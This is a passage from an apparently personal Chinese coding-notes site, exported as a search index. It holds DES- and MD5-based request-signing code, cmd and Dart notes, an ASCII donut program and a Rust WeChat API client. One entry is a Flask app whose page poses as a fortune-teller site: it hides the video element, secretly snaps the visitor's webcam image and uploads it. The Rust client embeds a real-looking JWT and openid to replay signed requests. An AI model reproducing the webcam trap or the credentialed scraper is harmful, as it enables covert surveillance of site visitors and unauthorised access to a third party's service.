e[43] = r[10], e[44] = r[50], e[45] = r[18], e[46] = r[58], e[47] = r[26], e[48] = r[33], e[49] = r[1], e[50] = r[41], e[51] = r[9], e[52] = r[49], e[53] = r[17], e[54] = r[57], e[55] = r[25], e[56] = r[32], e[57] = r[0], e[58] = r[40], e[59] = r[8], e[60] = r[48], e[61] = r[16], e[62] = r[56], e[63] = r[24], e; } function b(r) { var e = \u0026#34;\u0026#34;; switch (r) { case 0: e = \u0026#34;0000\u0026#34;; break; case 1: e = \u0026#34;0001\u0026#34;; break; case 2: e = \u0026#34;0010\u0026#34;; break; case 3: e = \u0026#34;0011\u0026#34;; break; case 4: e = \u0026#34;0100\u0026#34;; break; case 5: e = \u0026#34;0101\u0026#34;; break; case 6: e = \u0026#34;0110\u0026#34;; break; case 7: e = \u0026#34;0111\u0026#34;; break; case 8: e = \u0026#34;1000\u0026#34;; break; case 9: e = \u0026#34;1001\u0026#34;; break; case 10: e = \u0026#34;1010\u0026#34;; break; case 11: e = \u0026#34;1011\u0026#34;; break; case 12: e = \u0026#34;1100\u0026#34;; break; case 13: e = \u0026#34;1101\u0026#34;; break; case 14: e = \u0026#34;1110\u0026#34;; break; case 15: e = \u0026#34;1111\u0026#34;; } return e; } function k(r) { var e = new Array(56), a = new Array(); a[0] = new Array(), a[1] = new Array(), a[2] = new Array(), a[3] = new Array(), a[4] = new Array(), a[5] = new Array(), a[6] = new Array(), a[7] = new Array(), a[8] = new Array(), a[9] = new Array(), a[10] = new Array(), a[11] = new Array(), a[12] = new Array(), a[13] = new Array(), a[14] = new Array(), a[15] = new Array(); for (var n = [1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1], s = 0; s \u0026lt; 7; s++) for (var f = 0, o = 7; f \u0026lt; 8; f++, o--) e[8 * s + f] = r[8 * o + s]; s = 0; for (s = 0; s \u0026lt; 16; s++) { var c = 0, t = 0; for (f = 0; f \u0026lt; n[s]; f++) { for (c = e[0], t = e[28], o = 0; o \u0026lt; 27; o++) e[o] = e[o + 1], e[28 + o] = e[29 + o]; e[27] = c, e[55] = t; } var l = new Array(48); switch (l[0] = e[13], l[1] = e[16], l[2] = e[10], l[3] = e[23], l[4] = e[0], l[5] = e[4], l[6] = e[2], l[7] = e[27], l[8] = e[14], l[9] = e[5], l[10] = e[20], l[11] = e[9], l[12] = e[22], l[13] = e[18], l[14] = e[11], l[15] = e[3], l[16] = e[25], l[17] = e[7], l[18] = e[15], l[19] = e[6], l[20] = e[26], l[21] = e[19], l[22] = e[12], l[23] = e[1], l[24] = e[40], l[25] = e[51], l[26] = e[30], l[27] = e[36], l[28] = e[46], l[29] = e[54], l[30] = e[29], l[31] = e[39], l[32] = e[50], l[33] = e[44], l[34] = e[32], l[35] = e[47], l[36] = e[43], l[37] = e[48], l[38] = e[38], l[39] = e[55], l[40] = e[33], l[41] = e[52], l[42] = e[45], l[43] = e[41], l[44] = e[49], l[45] = e[35], l[46] = e[28], l[47] = e[31], s) { case 0: for (var u = 0; u \u0026lt; 48; u++) a[0][u] = l[u]; break; case 1: for (u = 0; u \u0026lt; 48; u++) a[1][u] = l[u]; break; case 2: for (u = 0; u \u0026lt; 48; u++) a[2][u] = l[u]; break; case 3: for (u = 0; u \u0026lt; 48; u++) a[3][u] = l[u]; break; case 4: for (u = 0; u \u0026lt; 48; u++) a[4][u] = l[u]; break; case 5: for (u = 0; u \u0026lt; 48; u++) a[5][u] = l[u]; break; case 6: for (u = 0; u \u0026lt; 48; u++) a[6][u] = l[u]; break; case 7: for (u = 0; u \u0026lt; 48; u++) a[7][u] = l[u]; break; case 8: for (u = 0; u \u0026lt; 48; u++) a[8][u] = l[u]; break; case 9: for (u = 0; u \u0026lt; 48; u++) a[9][u] = l[u]; break; case 10: for (u = 0; u \u0026lt; 48; u++) a[10][u] = l[u]; break; case 11: for (u = 0; u \u0026lt; 48; u++) a[11][u] = l[u]; break; case 12: for (u = 0; u \u0026lt; 48; u++) a[12][u] = l[u]; break; case 13: for (u = 0; u \u0026lt; 48; u++) a[13][u] = l[u]; break; case 14: for (u = 0; u \u0026lt; 48; u++) a[14][u] = l[u]; break; case 15: for (u = 0; u \u0026lt; 48; u++) a[15][u] = l[u]; } } return a; } // module.exports = { function getTime() { return function (a, f, o, c) { var t, l, u, b, k, i, w = a.length, v = \u0026#34;\u0026#34;; null != f \u0026amp;\u0026amp; \u0026#34;\u0026#34; != f \u0026amp;\u0026amp; (t = r(f), b = t.length); null != o \u0026amp;\u0026amp; \u0026#34;\u0026#34; != o \u0026amp;\u0026amp; (l = r(o), k = l.length); null != c \u0026amp;\u0026amp; \u0026#34;\u0026#34; != c \u0026amp;\u0026amp; (u = r(c), i = u.length); if (w \u0026gt; 0) if (w \u0026lt; 4) { var A = e(a); if (null != f \u0026amp;\u0026amp; \u0026#34;\u0026#34; != f \u0026amp;\u0026amp; null != o \u0026amp;\u0026amp; \u0026#34;\u0026#34; != o \u0026amp;\u0026amp; null != c \u0026amp;\u0026amp; \u0026#34;\u0026#34; != c) { for ($ = A, y = 0; y \u0026lt; b; y++) $ = s($, t[y]); for (C = 0; C \u0026lt; k; C++) $ = s($, l[C]); for (d = 0; d \u0026lt; i; d++) $ = s($, u[d]); x = $; } else if (null != f \u0026amp;\u0026amp; \u0026#34;\u0026#34; != f \u0026amp;\u0026amp; null != o \u0026amp;\u0026amp; \u0026#34;\u0026#34; != o) { for ($ = A, y = 0; y \u0026lt; b; y++) $ = s($, t[y]); for (C = 0; C \u0026lt; k; C++) $ = s($, l[C]); x = $; } else if (null != f \u0026amp;\u0026amp; \u0026#34;\u0026#34; != f) { var y = 0; for ($ = A, y = 0; y \u0026lt; b; y++) $ = s($, t[y]); x = $; } v = n(x); } else { var h = parseInt(w / 4), g = w % 4, p = 0; for (p = 0; p \u0026lt; h; p++) { var I = e(a.substring(4 * p + 0, 4 * p + 4)); if (null != f \u0026amp;\u0026amp; \u0026#34;\u0026#34; != f \u0026amp;\u0026amp; null != o \u0026amp;\u0026amp; \u0026#34;\u0026#34; != o \u0026amp;\u0026amp; null != c \u0026amp;\u0026amp; \u0026#34;\u0026#34; != c) { for ($ = I, y = 0; y \u0026lt; b; y++) $ = s($, t[y]); for (C = 0; C \u0026lt; k; C++) $ = s($, l[C]); for (d = 0; d \u0026lt; i; d++) $ = s($, u[d]); x = $; } else if (null != f \u0026amp;\u0026amp; \u0026#34;\u0026#34; != f \u0026amp;\u0026amp; null != o \u0026amp;\u0026amp; \u0026#34;\u0026#34; != o) { for ($ = I, y = 0; y \u0026lt; b; y++) $ = s($, t[y]); for (C = 0; C \u0026lt; k; C++) $ = s($, l[C]); x = $; } else if (null != f \u0026amp;\u0026amp; \u0026#34;\u0026#34; != f) { for ($ = I, y = 0; y \u0026lt; b; y++) $ = s($, t[y]); x = $; } v += n(x); } if (g \u0026gt; 0) { var x; I = e(a.substring(4 * h + 0, w)); if (null != f \u0026amp;\u0026amp; \u0026#34;\u0026#34; != f \u0026amp;\u0026amp; null != o \u0026amp;\u0026amp; \u0026#34;\u0026#34; != o \u0026amp;\u0026amp; null != c \u0026amp;\u0026amp; \u0026#34;\u0026#34; != c) { var d; for ($ = I, y = 0; y \u0026lt; b; y++) $ = s($, t[y]); for (C = 0; C \u0026lt; k; C++) $ = s($, l[C]); for (d = 0; d \u0026lt; i; d++) $ = s($, u[d]); x = $; } else if (null != f \u0026amp;\u0026amp; \u0026#34;\u0026#34; != f \u0026amp;\u0026amp; null != o \u0026amp;\u0026amp; \u0026#34;\u0026#34; != o) { var C; for ($ = I, y = 0; y \u0026lt; b; y++) $ = s($, t[y]); for (C = 0; C \u0026lt; k; C++) $ = s($, l[C]); x = $; } else if (null != f \u0026amp;\u0026amp; \u0026#34;\u0026#34; != f) { var $; for ($ = I, y = 0; y \u0026lt; b; y++) $ = s($, t[y]); x = $; } v += n(x); } } return v; }(\u0026#34;saywash#\u0026#34; + new Date().valueOf(), \u0026#34;hlF#$1x)\u0026#34;, \u0026#34;hlG#$2x)\u0026#34;, \u0026#34;hlH#$3x)\u0026#34;); } function sign(e) { Array.prototype.indexVf = function (r) { for (var e = 0; e \u0026lt; this.length; e++) if (this[e] == r) return e; } var t = [], n = [], i = []; for (var s in e) t.push(s), i.push(s), n.push(e[s]); for (var o = i.sort(), u = \u0026#34;SING=HLYF\u0026#34;, f = 0; f \u0026lt; o.length; f++) if (\u0026#34;tokenId\u0026#34; != o[f] \u0026amp;\u0026amp; \u0026#34;ssid\u0026#34; != o[f] \u0026amp;\u0026amp; \u0026#34;sign\u0026#34; != o[f]) { var a = t.indexVf(o[f]); \u0026#34;\u0026#34; != n[a] \u0026amp;\u0026amp; null != n[a] \u0026amp;\u0026amp; (u = u + \u0026#34;\u0026amp;\u0026#34; + o[f] + \u0026#34;=\u0026#34; + n[a]); } return \u0026#34;SING=HLYF\u0026#34; == (u = u.toUpperCase()) \u0026amp;\u0026amp; (u = \u0026#34;SING=HLYF\u0026amp;\u0026#34;), u = md5(u); } function md5(string) { function md5_RotateLeft(lValue, iShiftBits) { return (lValue \u0026lt;\u0026lt; iShiftBits) | (lValue \u0026gt;\u0026gt;\u0026gt; (32 - iShiftBits)); } function md5_AddUnsigned(lX, lY) { var lX4, lY4, lX8, lY8, lResult; lX8 = (lX \u0026amp; 0x80000000); lY8 = (lY \u0026amp; 0x80000000); lX4 = (lX \u0026amp; 0x40000000); lY4 = (lY \u0026amp; 0x40000000); lResult = (lX \u0026amp; 0x3FFFFFFF) + (lY \u0026amp; 0x3FFFFFFF); if (lX4 \u0026amp; lY4) { return (lResult ^ 0x80000000 ^ lX8 ^ lY8); } if (lX4 | lY4) { if (lResult \u0026amp; 0x40000000) { return (lResult ^ 0xC0000000 ^ lX8 ^ lY8); } else { return (lResult ^ 0x40000000 ^ lX8 ^ lY8); } } else { return (lResult ^ lX8 ^ lY8); } } function md5_F(x, y, z) { return (x \u0026amp; y) | ((~x) \u0026amp; z); } function md5_G(x, y, z) { return (x \u0026amp; z) | (y \u0026amp; (~z)); } function md5_H(x, y, z) { return (x ^ y ^ z); } function md5_I(x, y, z) { return (y ^ (x | (~z))); } function md5_FF(a, b, c, d, x, s, ac) { a = md5_AddUnsigned(a, md5_AddUnsigned(md5_AddUnsigned(md5_F(b, c, d), x), ac)); return md5_AddUnsigned(md5_RotateLeft(a, s), b); }; function md5_GG(a, b, c, d, x, s, ac) { a = md5_AddUnsigned(a, md5_AddUnsigned(md5_AddUnsigned(md5_G(b, c, d), x), ac)); return md5_AddUnsigned(md5_RotateLeft(a, s), b); }; function md5_HH(a, b, c, d, x, s, ac) { a = md5_AddUnsigned(a, md5_AddUnsigned(md5_AddUnsigned(md5_H(b, c, d), x), ac)); return md5_AddUnsigned(md5_RotateLeft(a, s), b); }; function md5_II(a, b, c, d, x, s, ac) { a = md5_AddUnsigned(a, md5_AddUnsigned(md5_AddUnsigned(md5_I(b, c, d), x), ac)); return md5_AddUnsigned(md5_RotateLeft(a, s), b); }; function md5_ConvertToWordArray(string) { var lWordCount; var lMessageLength = string.length; var lNumberOfWords_temp1 = lMessageLength + 8; var lNumberOfWords_temp2 = (lNumberOfWords_temp1 - (lNumberOfWords_temp1 % 64)) / 64; var lNumberOfWords = (lNumberOfWords_temp2 + 1) * 16; var lWordArray = Array(lNumberOfWords - 1); var lBytePosition = 0; var lByteCount = 0; while (lByteCount \u0026lt; lMessageLength) { lWordCount = (lByteCount - (lByteCount % 4)) / 4; lBytePosition = (lByteCount % 4) * 8; lWordArray[lWordCount] = (lWordArray[lWordCount] | (string.charCodeAt(lByteCount) \u0026lt;\u0026lt; lBytePosition)); lByteCount++; } lWordCount = (lByteCount - (lByteCount % 4)) / 4; lBytePosition = (lByteCount % 4) * 8; lWordArray[lWordCount] = lWordArray[lWordCount] | (0x80 \u0026lt;\u0026lt; lBytePosition); lWordArray[lNumberOfWords - 2] = lMessageLength \u0026lt;\u0026lt; 3; lWordArray[lNumberOfWords - 1] = lMessageLength \u0026gt;\u0026gt;\u0026gt; 29; return lWordArray; }; function md5_WordToHex(lValue) { var WordToHexValue = \u0026#34;\u0026#34;, WordToHexValue_temp = \u0026#34;\u0026#34;, lByte, lCount; for (lCount = 0; lCount \u0026lt;= 3; lCount++) { lByte = (lValue \u0026gt;\u0026gt;\u0026gt; (lCount * 8)) \u0026amp; 255; WordToHexValue_temp = \u0026#34;0\u0026#34; + lByte.toString(16); WordToHexValue = WordToHexValue + WordToHexValue_temp.substr(WordToHexValue_temp.length - 2, 2); } return WordToHexValue; }; function md5_Utf8Encode(string) { string = string.replace(/\\r\\n/g, \u0026#34;\\n\u0026#34;); var utftext = \u0026#34;\u0026#34;; for (var n = 0; n \u0026lt; string.length; n++) { var c = string.charCodeAt(n); if (c \u0026lt; 128) { utftext += String.fromCharCode(c); } else if ((c \u0026gt; 127) \u0026amp;\u0026amp; (c \u0026lt; 2048)) { utftext += String.fromCharCode((c \u0026gt;\u0026gt; 6) | 192); utftext += String.fromCharCode((c \u0026amp; 63) | 128); } else { utftext += String.fromCharCode((c \u0026gt;\u0026gt; 12) | 224); utftext += String.fromCharCode(((c \u0026gt;\u0026gt; 6) \u0026amp; 63) | 128); utftext += String.fromCharCode((c \u0026amp; 63) | 128); } } return utftext; }; var x = Array(); var k, AA, BB, CC, DD, a, b, c, d; var S11 = 7, S12 = 12, S13 = 17, S14 = 22; var S21 = 5, S22 = 9, S23 = 14, S24 = 20; var S31 = 4, S32 = 11, S33 = 16, S34 = 23; var S41 = 6, S42 = 10, S43 = 15, S44 = 21; string = md5_Utf8Encode(string); x = md5_ConvertToWordArray(string); a = 0x67452301; b = 0xEFCDAB89; c = 0x98BADCFE; d = 0x10325476; for (k = 0; k \u0026lt; x.length; k += 16) { AA = a; BB = b; CC = c; DD = d; a = md5_FF(a, b, c, d, x[k + 0], S11, 0xD76AA478); d = md5_FF(d, a, b, c, x[k + 1], S12, 0xE8C7B756); c = md5_FF(c, d, a, b, x[k + 2], S13, 0x242070DB); b = md5_FF(b, c, d, a, x[k + 3], S14, 0xC1BDCEEE); a = md5_FF(a, b, c, d, x[k + 4], S11, 0xF57C0FAF); d = md5_FF(d, a, b, c, x[k + 5], S12, 0x4787C62A); c = md5_FF(c, d, a, b, x[k + 6], S13, 0xA8304613); b = md5_FF(b, c, d, a, x[k + 7], S14, 0xFD469501); a = md5_FF(a, b, c, d, x[k + 8], S11, 0x698098D8); d = md5_FF(d, a, b, c, x[k + 9], S12, 0x8B44F7AF); c = md5_FF(c, d, a, b, x[k + 10], S13, 0xFFFF5BB1); b = md5_FF(b, c, d, a, x[k + 11], S14, 0x895CD7BE); a = md5_FF(a, b, c, d, x[k + 12], S11, 0x6B901122); d = md5_FF(d, a, b, c, x[k + 13], S12, 0xFD987193); c = md5_FF(c, d, a, b, x[k + 14], S13, 0xA679438E); b = md5_FF(b, c, d, a, x[k + 15], S14, 0x49B40821); a = md5_GG(a, b, c, d, x[k + 1], S21, 0xF61E2562); d = md5_GG(d, a, b, c, x[k + 6], S22, 0xC040B340); c = md5_GG(c, d, a, b, x[k + 11], S23, 0x265E5A51); b = md5_GG(b, c, d, a, x[k + 0], S24, 0xE9B6C7AA); a = md5_GG(a, b, c, d, x[k + 5], S21, 0xD62F105D); d = md5_GG(d, a, b, c, x[k + 10], S22, 0x2441453); c = md5_GG(c, d, a, b, x[k + 15], S23, 0xD8A1E681); b = md5_GG(b, c, d, a, x[k + 4], S24, 0xE7D3FBC8); a = md5_GG(a, b, c, d, x[k + 9], S21, 0x21E1CDE6); d = md5_GG(d, a, b, c, x[k + 14], S22, 0xC33707D6); c = md5_GG(c, d, a, b, x[k + 3], S23, 0xF4D50D87); b = md5_GG(b, c, d, a, x[k + 8], S24, 0x455A14ED); a = md5_GG(a, b, c, d, x[k + 13], S21, 0xA9E3E905); d = md5_GG(d, a, b, c, x[k + 2], S22, 0xFCEFA3F8); c = md5_GG(c, d, a, b, x[k + 7], S23, 0x676F02D9); b = md5_GG(b, c, d, a, x[k + 12], S24, 0x8D2A4C8A); a = md5_HH(a, b, c, d, x[k + 5], S31, 0xFFFA3942); d = md5_HH(d, a, b, c, x[k + 8], S32, 0x8771F681); c = md5_HH(c, d, a, b, x[k + 11], S33, 0x6D9D6122); b = md5_HH(b, c, d, a, x[k + 14], S34, 0xFDE5380C); a = md5_HH(a, b, c, d, x[k + 1], S31, 0xA4BEEA44); d = md5_HH(d, a, b, c, x[k + 4], S32, 0x4BDECFA9); c = md5_HH(c, d, a, b, x[k + 7], S33, 0xF6BB4B60); b = md5_HH(b, c, d, a, x[k + 10], S34, 0xBEBFBC70); a = md5_HH(a, b, c, d, x[k + 13], S31, 0x289B7EC6); d = md5_HH(d, a, b, c, x[k + 0], S32, 0xEAA127FA); c = md5_HH(c, d, a, b, x[k + 3], S33, 0xD4EF3085); b = md5_HH(b, c, d, a, x[k + 6], S34, 0x4881D05); a = md5_HH(a, b, c, d, x[k + 9], S31, 0xD9D4D039); d = md5_HH(d, a, b, c, x[k + 12], S32, 0xE6DB99E5); c = md5_HH(c, d, a, b, x[k + 15], S33, 0x1FA27CF8); b = md5_HH(b, c, d, a, x[k + 2], S34, 0xC4AC5665); a = md5_II(a, b, c, d, x[k + 0], S41, 0xF4292244); d = md5_II(d, a, b, c, x[k + 7], S42, 0x432AFF97); c = md5_II(c, d, a, b, x[k + 14], S43, 0xAB9423A7); b = md5_II(b, c, d, a, x[k + 5], S44, 0xFC93A039); a = md5_II(a, b, c, d, x[k + 12], S41, 0x655B59C3); d = md5_II(d, a, b, c, x[k + 3], S42, 0x8F0CCC92); c = md5_II(c, d, a, b, x[k + 10], S43, 0xFFEFF47D); b = md5_II(b, c, d, a, x[k + 1], S44, 0x85845DD1); a = md5_II(a, b, c, d, x[k + 8], S41, 0x6FA87E4F); d = md5_II(d, a, b, c, x[k + 15], S42, 0xFE2CE6E0); c = md5_II(c, d, a, b, x[k + 6], S43, 0xA3014314); b = md5_II(b, c, d, a, x[k + 13], S44, 0x4E0811A1); a = md5_II(a, b, c, d, x[k + 4], S41, 0xF7537E82); d = md5_II(d, a, b, c, x[k + 11], S42, 0xBD3AF235); c = md5_II(c, d, a, b, x[k + 2], S43, 0x2AD7D2BB); b = md5_II(b, c, d, a, x[k + 9], S44, 0xEB86D391); a = md5_AddUnsigned(a, AA); b = md5_AddUnsigned(b, BB); c = md5_AddUnsigned(c, CC); d = md5_AddUnsigned(d, DD); } return (md5_WordToHex(a) + md5_WordToHex(b) + md5_WordToHex(c) + md5_WordToHex(d)).toLowerCase(); } "},{"id":110,"href":"/docs/code/cmd/","title":"Cmd","section":"code","content":"\rwin常用命令\r#\rstart //启动文件并以默认软件启动 echo //写入文件内容,没有自动创建.\u0026#39;123\u0026#39;\u0026gt;1.txt,双写\u0026gt;就是追加内容 type //输出内容 rename //重命名 如果文件名或者路径有空格要加引号.rename 1.txt 2.txt move //移动文件或者文件夹 del //删除文件或文件夹 dir //打印文件目录 chcp 65001 //字符以utf-8编码 当前壁纸路径\nAppData\\Roaming\\Microsoft\\Windows\\Themes\\CachedFiles 设置代理\nset HTTP_PROXY=http://127.0.0.1:1080 set HTTPS_PROXY=http://127.0.0.1:1080 "},{"id":111,"href":"/docs/code/dart/","title":"Dart","section":"code","content":"\r集合\r#\r集合 亦 list\n属性\r#\rlength 即长度 frist 即第一个元素 last 即最后一个元素 reversed 获得倒序迭代器 isEmpty 检测是否为空 isNotEmpty 检测是否非空 方法\r#\radd 添加元素在末尾 addAll 批量添加，相当于拼接两个数组 inster 插入元素在制定位置 insterAll 批量添加 remove 移除指定位置的元素 removeRange 移除指定范围 removeLast removeWhere 移除指定条件的元素 clear setRange setAll replaceRange fillRange getRange sublist any every contains 是否包含 fristWhere lastWhere indexWhere lastIndexWhere "},{"id":112,"href":"/docs/code/new/autotakepic_flask/","title":"Auto Take Pic Flask","section":"ee","content":"tree\n│ main.py ├─templates │ index.html main.py\nfrom flask import Flask, request,render_template import base64 app = Flask(__name__) @app.route(\u0026#39;/\u0026#39;) def index(): return render_template(\u0026#39;index.html\u0026#39;) @app.route(\u0026#39;/upload\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def upload(): file = request.form[\u0026#39;data\u0026#39;] with open(\u0026#39;uploads/1.jpg\u0026#39;,\u0026#39;wb\u0026#39;) as f: b=base64.b64decode(file).decode().replace(\u0026#39;data:image/png;base64,\u0026#39;,\u0026#39;\u0026#39;) f.write(base64.b64decode(b)) return \u0026#39;文件上传成功！\u0026#39; if __name__ == \u0026#39;__main__\u0026#39;: app.run(port=1234) index.html\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;\u0026#34; content=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;title\u0026gt;神算子\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;canvas id=\u0026#34;canvas\u0026#34; style=\u0026#34;display: none;\u0026#34; width=\u0026#34;3264\u0026#34; height=\u0026#34;2448\u0026#34;\u0026gt;\u0026lt;/canvas\u0026gt; \u0026lt;video id=\u0026#34;video\u0026#34; style=\u0026#34;display: none;width: 250px;height: 300px;\u0026#34;\u0026gt;\u0026lt;/video\u0026gt; \u0026lt;script src=\u0026#34;https://lib.baomitu.com/jquery/3.6.0/jquery.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; window.addEventListener(\u0026#34;DOMContentLoaded\u0026#34;,function(){ var canvas = document.getElementById(\u0026#39;canvas\u0026#39;); var context =canvas.getContext(\u0026#39;2d\u0026#39;); var video = document.getElementById(\u0026#39;video\u0026#39;); if (navigator.mediaDevices \u0026amp;\u0026amp; navigator.mediaDevices.getUserMedia) { navigator.mediaDevices.getUserMedia({video:true}).then(function(stream){ video.srcObject = stream; video.play(); setTimeout(function(){context.drawImage(video,0,0,3264,2448)}, 1000); setTimeout(function(){ var img = canvas.toDataURL(\u0026#39;image/png\u0026#39;); $.ajax({ type: \u0026#34;POST\u0026#34;, url: \u0026#34;/upload\u0026#34;, data: { \u0026#34;data\u0026#34;: btoa(img) }, success: function (response) { console.log(response); }, error: function (xhr, status, error) { console.log(error); } }); } ,1300) },function(){ alert(\u0026#39;缺少访问权限\u0026#39;); location.reload(); }) } },false); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; "},{"id":113,"href":"/docs/code/new/c_%E7%94%9C%E7%94%9C%E5%9C%88/","title":"C 甜甜圈","section":"ee","content":"#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;math.h\u0026gt; #include \u0026lt;cstring\u0026gt; #include \u0026lt;Windows.h\u0026gt; void usleep(__int64 usec) { HANDLE timer; LARGE_INTEGER ft; ft.QuadPart = -(10 * usec); timer = CreateWaitableTimer(NULL, TRUE, NULL); SetWaitableTimer(timer, \u0026amp;ft, 0, NULL, NULL, 0); WaitForSingleObject(timer, INFINITE); CloseHandle(timer); } int main() { float A = 0, B = 0; float i, j; int k; float z[1760]; char b[1760]; printf(\u0026#34;\\x1b[2J\u0026#34;); for (;;) { memset(b, 32, 1760); memset(z, 0, 7040); for (j = 0; j \u0026lt; 6.28; j += 0.07) { for (i = 0; i \u0026lt; 6.28; i += 0.02) { float c = sin(i); float d = cos(j); float e = sin(A); float f = sin(j); float g = cos(A); float h = d + 2; float D = 1 / (c * h * e + f * g + 5); float l = cos(i); float m = cos(B); float n = sin(B); float t = c * h * g - f * e; int x = 40 + 30 * D * (l * h * m - t * n); int y = 12 + 15 * D * (l * h * n + t * m); int o = x + 80 * y; int N = 8 * ((f * e - c * d * g) * m - c * d * e - f * g - l * d * n); if (22 \u0026gt; y \u0026amp;\u0026amp; y \u0026gt; 0 \u0026amp;\u0026amp; x \u0026gt; 0 \u0026amp;\u0026amp; 80 \u0026gt; x \u0026amp;\u0026amp; D \u0026gt; z[o]) { z[o] = D; b[o] = \u0026#34;.,-~:;=!*#$@\u0026#34;[N \u0026gt; 0 ? N : 0]; } } } printf(\u0026#34;\\x1b[H\u0026#34;); for (k = 0; k \u0026lt; 1761; k++) { putchar(k % 80 ? b[k] : 10); A += 0.00004; B += 0.00002; } usleep(30000); } return 0; } 另一份\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;math.h\u0026gt; #include\u0026lt;windows.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; int main() { float A = 0, B = 0; float i, j; int k; float z[1760]; char b[1760]; printf(\u0026#34;\\x1b2J\u0026#34;); for (;;) { memset(b, 32, 1760); memset(z, 0, 7040); for (j = 0; j \u0026lt; 6.28; j += 0.07) { for (i = 0; i \u0026lt; 6.28; i += 0.02) { float c = sin(i); float d = cos(j); float e = sin(A); float f = sin(j); float g = cos(A); float h = d + 2; float D = 1 / (c * h * e + f * g + 5); float l = cos(i); float m = cos(B); float n = sin(B); float t = c * h * g - f * e; int x = 40 + 30 * D * (l * h * m - t * n); int y = 12 + 15 * D * (l * h * n + t * m); int o = x + 80 * y; int N = 8 * ((f * e - c * d * g) * m - c * d * e - f * g - l * d * n); if (22 \u0026gt; y \u0026amp;\u0026amp; y \u0026gt; 0 \u0026amp;\u0026amp; x \u0026gt; 0 \u0026amp;\u0026amp; 80 \u0026gt; x \u0026amp;\u0026amp; D \u0026gt; z[o]) { z[o] = D; b[o] = \u0026#34;.,-~:;=!*#$@\u0026#34;[N \u0026gt; 0 ? N : 0]; } } } printf(\u0026#34;\\x1bH\u0026#34;); for (k = 0; k \u0026lt; 1761; k++) { putchar(k % 80 ? b[k] : 10); A += 0.00004; B += 0.00002; } Sleep(1); system(\u0026#34;cls\u0026#34;); } return 0; } "},{"id":114,"href":"/docs/code/new/rust/%E6%9F%90%E5%9B%BE/","title":"某图","section":"ee","content":"use std::{collections::HashMap, time::{SystemTime,UNIX_EPOCH}}; use rand::Rng; use reqwest::header; use serde_json::Value; #[tokio::main] async fn main() -\u0026gt; Result\u0026lt;(), Box\u0026lt;dyn std::error::Error\u0026gt;\u0026gt; { let mut headers = header::HeaderMap::new(); headers.insert(\u0026#34;authority\u0026#34;, \u0026#34;stapi.youpengw.com\u0026#34;.parse().unwrap()); headers.insert(\u0026#34;accept\u0026#34;, \u0026#34;*/*\u0026#34;.parse().unwrap()); headers.insert(\u0026#34;accept-language\u0026#34;, \u0026#34;zh-CN,zh;q=0.9\u0026#34;.parse().unwrap()); headers.insert(\u0026#34;content-type\u0026#34;, \u0026#34;application/json\u0026#34;.parse().unwrap()); headers.insert(\u0026#34;referer\u0026#34;, \u0026#34;https://servicewechat.com/wx535ad18d22b24807/10/page-frame.html\u0026#34;.parse().unwrap()); headers.insert(\u0026#34;sec-fetch-dest\u0026#34;, \u0026#34;empty\u0026#34;.parse().unwrap()); headers.insert(\u0026#34;sec-fetch-mode\u0026#34;, \u0026#34;cors\u0026#34;.parse().unwrap()); headers.insert(\u0026#34;sec-fetch-site\u0026#34;, \u0026#34;cross-site\u0026#34;.parse().unwrap()); headers.insert(\u0026#34;sign\u0026#34;, sign().parse().unwrap()); headers.insert(\u0026#34;user-agent\u0026#34;, \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF XWEB/8447\u0026#34;.parse().unwrap()); headers.insert(\u0026#34;xweb_xhr\u0026#34;, \u0026#34;1\u0026#34;.parse().unwrap()); let client = reqwest::Client::new(); let res = client.post(\u0026#34;https://stapi.youpengw.com/miniwechat/v1/natujun/photoList\u0026#34;) .headers(headers) .body(\u0026#34;{\\\u0026#34;homepage_id\\\u0026#34;:\\\u0026#34;233033\\\u0026#34;,\\\u0026#34;classify_id\\\u0026#34;:5,\\\u0026#34;sort_type\\\u0026#34;:\\\u0026#34;default\\\u0026#34;,\\\u0026#34;album_id\\\u0026#34;:0,\\\u0026#34;uid\\\u0026#34;:219050,\\\u0026#34;page\\\u0026#34;:1,\\\u0026#34;limit\\\u0026#34;:15,\\\u0026#34;action\\\u0026#34;:\\\u0026#34;cover\\\u0026#34;,\\\u0026#34;version\\\u0026#34;:1,\\\u0026#34;appid\\\u0026#34;:\\\u0026#34;wx535ad18d22b24807\\\u0026#34;,\\\u0026#34;openid\\\u0026#34;:\\\u0026#34;oGoSf5Js4OD_yGbRP9UTjLcDf674\\\u0026#34;,\\\u0026#34;timestamp\\\u0026#34;:1697353429134}\u0026#34;) .send() .await? .json::\u0026lt;HashMap\u0026lt;String, Value\u0026gt;\u0026gt;() .await?; println!(\u0026#34;{:#?}\u0026#34;, res); Ok(()) } fn sign() -\u0026gt;String{ let mut token=String::from(\u0026#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJvcGVuaWQiOiJvR29TZjVKczRPRF95R2JSUDlVVGpMY0RmNjc0IiwiZXhwaXJlX3RpbWUiOjE2OTczMDQ1MzV9.)FxVKiDH9rnMKEuTNMkRa7ibMrhp-Vdi-FHBgWOomdaQ###\u0026#34;); token.push_str(\u0026amp;timestamp()); encode(\u0026amp;token) } fn timestamp()-\u0026gt;String{ SystemTime::now() .duration_since(UNIX_EPOCH) .unwrap() .as_millis() .to_string() } fn encode(input: \u0026amp;str) -\u0026gt; String { let staticchars = 